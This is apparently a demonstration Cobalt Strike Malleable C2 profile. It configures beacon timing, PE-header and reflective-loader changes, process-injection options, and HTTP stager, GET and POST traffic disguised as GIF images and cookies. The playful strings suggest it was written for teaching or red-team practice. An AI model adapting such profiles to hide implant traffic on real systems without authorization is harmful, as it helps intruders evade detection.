# Demonstration Profile
#
#
# Author: Lee Kagan
#
#---------------------------------

set sample_name "Lee-Demo-Profile";

set sleeptime "15000";

set jitter "15";

set maxdns "255";

set spawnto_x86 "%windir%\\syswow64\\calc.exe";
set spawnto_x64 "%windir%\\sysnative\\notepad.exe";

set pipename "demoagent_11";
set pipename_stager "demoagent_22";

set hijack_remote_thread "true";

set useragent "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko";

stage {
	# PE header modifications
	set checksum "0";
	set compile_time "10 November 2010 10:10:10";
	set entry_point	"558586";
	set image_size_x86 "987136";
	set image_size_x64 "1232896";
	set name "kagan.dll";

	# Obfuscations
	set userwx "false";
	set stomppe "true";
	set obfuscate "false";

	# String  modifications
	stringw	"SeSecurityPrivilegeLol";
	string "CanYouSeeMe";
	data "FindMe";

	# Reflective loader modifications
	transform-x86 {
		prepend "\x90\x90";
		strrep "beacon.dll" "lees.dll";
		append "\x90\x90";
	}

	transform-x64 {
		prepend "\x90\x90";
		strrep "beacon.x64.dll" "lees64.dll";
		append "\x90\x90";
	}
}

http-stager {
	set uri_x86 "/get32.gif";
	set uri_x64 "/get64.gif";

	client {
		header "Cookie" "YummyCookie";
	}
	server {
		header "Content-Type" "image/gif";
		header "Connection" "Keep-Alive";
		output {
			prepend "GIF89a";
			print;
		}
	}
}

http-get {
	set uri "/c2demoget";

	client {
		header "Cache-Control" "no-cache";
		header "Connection" "Keep-Alive";
		header "Pragma" "no-cache";
		header "Accept" "*/*";
		header "Host" "www.ilikedemos.com";

		parameter "customParamName" "customParamValue";

		metadata {
			base64;
			prepend "session-token";
			append "token-session";
			header "Cookie";
		}
	}
	server {
		header "Content-Type" "application/octet-stream";
		header "Connection" "Keep-Alive";
		header "X-Not-Malware" "I Promise!";
		output {
			print;
		}
	}
}

http-post {
	set uri "/c2demopost";
	client {
		header "Cache-Control" "no-cache";
		header "Connection" "Keep-Alive";
		header "Pragma" "no-cache";

		id {
			base64url;
			append "evilPost";
			uri-append;
		}
		output {
			print;
		}
	}
	server {
		header "Content-Type" "application/octet-stream";
		header "Connection" "Keep-Alive";
		output {
			print;
		}
	}
}

process-inject {
	set min_alloc "16384";
	set startrwx "false";
	set userwx "false";

	transform-x86 {
			prepend "\x90\x90";
	}
	transform-x64 {
			prepend "\x90\x90";
	}

	disable "CreateRemoteThread";
}